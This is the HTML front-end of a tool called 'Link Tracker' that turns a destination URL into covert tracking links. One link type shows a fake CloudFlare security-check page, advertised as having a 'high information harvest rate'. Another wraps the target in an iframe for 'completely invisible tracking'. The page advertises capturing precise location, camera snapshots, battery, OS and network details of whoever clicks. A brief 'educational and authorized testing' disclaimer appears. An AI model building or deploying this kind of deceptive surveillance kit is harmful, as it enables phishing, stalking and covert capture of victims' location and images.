<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Tracker - Premium Data Collection</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>

<body>
    <div class="container">
        <header class="header">
            <h1><i class="fas fa-link"></i> Link Tracker</h1>
            <p class="subtitle">Generate professional, secure tracking links with advanced analytics</p>
        </header>

        <div class="card">
            <div class="card-header">
                <h2><i class="fas fa-plus-circle"></i> Create New Tracking Link</h2>
            </div>
            <div class="card-body">
                <form id="createLinkForm">
                    <div class="form-group">
                        <label for="userId">Your Tracking ID</label>
                        <input type="text" id="userId" placeholder="e.g., campaign_summer_2024" required>
                        <small>Share this ID only with those who need to view the dashboard</small>
                    </div>

                    <div class="form-group">
                        <label for="targetUrl">Destination URL</label>
                        <input type="url" id="targetUrl" placeholder="https://example.com/destination" required>
                        <small>The final destination for your visitors</small>
                    </div>

                    <button type="submit" class="btn btn-primary animated-gradient">
                        <span>Generate Tracking Links</span>
                        <div id="loader" class="spinner hidden" style="margin-left: 10px;"></div>
                    </button>
                </form>

                <div id="result" class="result hidden">
                    <h3><i class="fas fa-check-circle"></i> Tracking Links Ready!</h3>

                    <div class="link-section">
                        <h4><i class="fab fa-cloudflare"></i> CloudFlare Security Link</h4>
                        <p class="description">Displays a realistic security check page. High information harvest rate.
                        </p>
                        <div class="link-box">
                            <input type="text" id="cloudflareLink" readonly>
                            <button class="btn-copy" onclick="copyToClipboard('cloudflareLink')">Copy</button>
                        </div>
                        <div id="cloudflareShort" class="short-links hidden"></div>
                    </div>

                    <div class="link-section">
                        <h4><i class="fas fa-eye"></i> Webview Stealth Link</h4>
                        <p class="description">Shows the target site in an iframe. Completely invisible tracking.</p>
                        <div class="link-box">
                            <input type="text" id="webviewLink" readonly>
                            <button class="btn-copy" onclick="copyToClipboard('webviewLink')">Copy</button>
                        </div>
                        <div id="webviewShort" class="short-links hidden"></div>
                    </div>

                    <div class="dashboard-link">
                        <a id="dashboardLink" class="btn btn-secondary" target="_blank">
                            <i class="fas fa-chart-line"></i> Go to Analytics Dashboard
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <div class="stats-card">
            <h3><i class="fas fa-rocket"></i> Key Tracking Features</h3>
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-value"><i class="fas fa-map-marker-alt"></i></div>
                    <div class="stat-label">Precise Location</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><i class="fas fa-camera"></i></div>
                    <div class="stat-label">Multi-Snapshot</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><i class="fas fa-battery-full"></i></div>
                    <div class="stat-label">Battery & OS</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><i class="fas fa-network-wired"></i></div>
                    <div class="stat-label">Network Info</div>
                </div>
            </div>
        </div>

        <div class="info-card">
            <h3><i class="fas fa-info-circle"></i> Deployment & Ethics</h3>
            <ul>
                <li><strong>CloudFlare Method:</strong> Uses a 6-second verification delay to capture high-quality
                    system data and locations.</li>
                <li><strong>WebView Method:</strong> Immediately wraps the destination URL in an iframe for seamless
                    user experience while tracking.</li>
                <li><strong>Local vs Production:</strong> Ensure your <code>HOST_URL</code> is correctly set in
                    environment variables.</li>
                <li><strong>Ethical Note:</strong> This tool is for educational and authorized testing purposes only.
                    Respect user privacy.</li>
            </ul>
        </div>

        <footer class="footer">
            <p><i class="fas fa-shield-alt"></i> Powered by Link Tracker Pro | Premium Tracking Interface</p>
        </footer>
    </div>

    <script>
        const form = document.getElementById('createLinkForm');
        const result = document.getElementById('result');
        const loader = document.getElementById('loader');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const userId = document.getElementById('userId').value;
            const targetUrl = document.getElementById('targetUrl').value;

            const btn = form.querySelector('button');
            const btnText = btn.querySelector('span');

            btn.disabled = true;
            btnText.textContent = 'Processing...';
            loader.classList.remove('hidden');

            try {
                const response = await fetch('/api/create-link', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: targetUrl, userId: userId })
                });

                const data = await response.json();

                if (response.ok) {
                    document.getElementById('cloudflareLink').value = data.cloudflareLink;
                    document.getElementById('webviewLink').value = data.webviewLink;
                    document.getElementById('dashboardLink').href = `/dashboard/${userId}`;

                    if (data.cloudflareShortLinks) {
                        const cloudflareShort = document.getElementById('cloudflareShort');
                        cloudflareShort.innerHTML = '<h5>Shortened Alternatives:</h5>' +
                            data.cloudflareShortLinks.map(link =>
                                `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
                            ).join('');
                        cloudflareShort.classList.remove('hidden');
                    }

                    if (data.webviewShortLinks) {
                        const webviewShort = document.getElementById('webviewShort');
                        webviewShort.innerHTML = '<h5>Shortened Alternatives:</h5>' +
                            data.webviewShortLinks.map(link =>
                                `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
                            ).join('');
                        webviewShort.classList.remove('hidden');
                    }

                    result.classList.remove('hidden');
                    result.scrollIntoView({ behavior: 'smooth' });
                } else {
                    alert(data.error || 'Request failed');
                }
            } catch (error) {
                alert('Connection error: ' + error.message);
            } finally {
                btn.disabled = false;
                btnText.textContent = 'Generate Tracking Links';
                loader.classList.add('hidden');
            }
        });

        function copyToClipboard(elementId) {
            const input = document.getElementById(elementId);
            input.select();
            document.execCommand('copy');

            const btn = event.target;
            const originalText = btn.textContent;
            btn.textContent = 'Copied!';
            btn.style.background = '#059669';

            setTimeout(() => {
                btn.textContent = originalText;
                btn.style.background = '#10b981';
            }, 2000);
        }
    </script>
</body>

</html>